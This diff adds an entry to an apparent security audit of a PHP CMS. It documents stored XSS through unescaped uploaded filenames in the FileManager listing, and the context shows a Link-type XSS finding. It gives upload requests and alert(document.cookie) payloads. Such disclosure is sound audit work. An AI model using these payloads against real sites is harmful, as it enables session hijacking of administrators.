@@ -247,3 +247,19 @@ Frontend module params are prefixed `cntnt01`; admin module params are prefixed 
   ```
 - **Payload:** `url=javascript:alert(document.cookie)` or `url=x" onmouseover="alert(1)`
 - **Description:** The Link content type stores its target URL with no sanitization and `GetURL()` deliberately returns it unescaped (encoding commented out). Navigation menus render it directly into an `href`, so a content editor with "Add Pages" can plant a menu link that runs script when clicked (`javascript:` URI) or on hover (attribute breakout) — stored XSS on the public frontend.
+
+---
+
+## 20. Stored XSS — uploaded filename rendered unescaped in FileManager listing
+- **Name:** Stored Cross-Site Scripting (CWE-79)
+- **File:** `modules/FileManager/action.admin_fileview.php:101,123` (raw filename `$link` placed as link-text HTML) and `:166` (`alt="'.$file->name.'"`); upload sanitization `modules/FileManager/lib/class.jquery_upload_handler.php` `trim_file_name` only `basename()`s and trims bytes `.\x00..\x20` from the ends (leaves `<`, `>`, `"`), and `action.upload.php` blocks only `php*` extensions.
+- **URL:**
+  ```
+  upload (Modify Files, or FilePicker ajax_cmd #13 which needs no file perm):
+    POST .../moduleinterface.php?mact=FileManager,m1_,upload,0&__c=KEY  (multipart)
+    filename = <img src=x onerror=alert(document.cookie)>.txt
+  fire: any admin opens FileManager on that directory
+    https://TARGET/admin/moduleinterface.php?mact=FileManager,m1_,defaultadmin,0&__c=KEY
+  ```
+- **Payload:** upload a file named `<img src=x onerror=alert(document.cookie)>.txt`
+- **Description:** Uploaded filenames retain HTML metacharacters and are embedded raw into the file-list row HTML (link text and image `alt`), so a maliciously named file stored by a low-privilege uploader executes script in the browser of any administrator who later browses that folder — a stored XSS that crosses from a file-upload user to full admins.
